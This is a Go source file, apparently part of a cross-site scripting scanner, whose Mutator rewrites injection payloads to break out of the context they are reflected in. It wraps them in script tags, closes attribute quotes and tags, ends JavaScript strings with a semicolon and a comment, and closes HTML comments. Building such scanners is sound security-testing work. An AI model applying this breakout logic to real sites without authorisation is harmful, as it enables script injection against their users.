package payloads

import (
	"fmt"
	"strings"
)

// ContextType defines the location where payload is reflected
type ContextType string

const (
	ContextHTML      ContextType = "html"
	ContextAttribute ContextType = "attribute"
	ContextScript    ContextType = "script"
	ContextComment   ContextType = "comment"
	ContextUnknown   ContextType = "unknown"
)

// QuoteType defines the type of quote enclosing the payload
type QuoteType string

const (
	QuoteNone   QuoteType = "none"
	QuoteSingle QuoteType = "single"
	QuoteDouble QuoteType = "double"
	QuoteBack   QuoteType = "backtick"
)

// ContextInfo describes the environment of the reflected payload
// We replicate this simple struct to avoid circular dependency with scanner
type ContextInfo struct {
	Type         ContextType
	Quote        QuoteType
	EnclosingTag string
}

// Mutator handles payload adaptation based on context
type Mutator struct{}

// NewMutator creates a new payload mutator
func NewMutator() *Mutator {
	return &Mutator{}
}

// AdaptPayload modifies the payload to break out of the specific context
func (m *Mutator) AdaptPayload(payload string, ctx ContextInfo) string {
	switch ctx.Type {
	case ContextHTML:
		// In HTML context, we usually need new tags
		// If payload doesn't have tags, wrap it
		if !strings.Contains(payload, "<") {
			return fmt.Sprintf("<script>%s</script>", payload)
		}
		return payload

	case ContextAttribute:
		return m.breakAttribute(payload, ctx)

	case ContextScript:
		return m.breakScript(payload, ctx)

	case ContextComment:
		return "-->" + payload
	}

	return payload
}

func (m *Mutator) breakAttribute(payload string, ctx ContextInfo) string {
	prefix := ""

	// Close the attribute value
	switch ctx.Quote {
	case QuoteDouble:
		prefix = "\""
	case QuoteSingle:
		prefix = "'"
	case QuoteBack:
		prefix = "`"
	}

	// If inside a sensitive tag (img, input) we might just add an event handler
	// If the payload starts with a quote, we assume it's trying to break out already
	if strings.HasPrefix(payload, "\"") || strings.HasPrefix(payload, "'") {
		return payload // Trust the payload
	}

	// Strategy: Close attribute, close tag, start new tag
	// OR: Close attribute, add event handler (if possible)

	// Option 1: Break out completely (Most reliable)
	return fmt.Sprintf("%s><script>%s</script>", prefix, payload)
}

func (m *Mutator) breakScript(payload string, ctx ContextInfo) string {
	// If we are inside specific variable: var x = "PAYLOAD"
	prefix := ""
	suffix := ""

	switch ctx.Quote {
	case QuoteDouble:
		prefix = "\";"
		suffix = "//"
	case QuoteSingle:
		prefix = "';"
		suffix = "//"
	case QuoteBack:
		prefix = "`;"
		suffix = "//"
	case QuoteNone:
		prefix = ";"
		suffix = "//"
	}

	// Payload usually is essentially the JS code to execute e.g. "alert(1)"
	// So we construct: ";alert(1)//"
	return prefix + payload + suffix
}
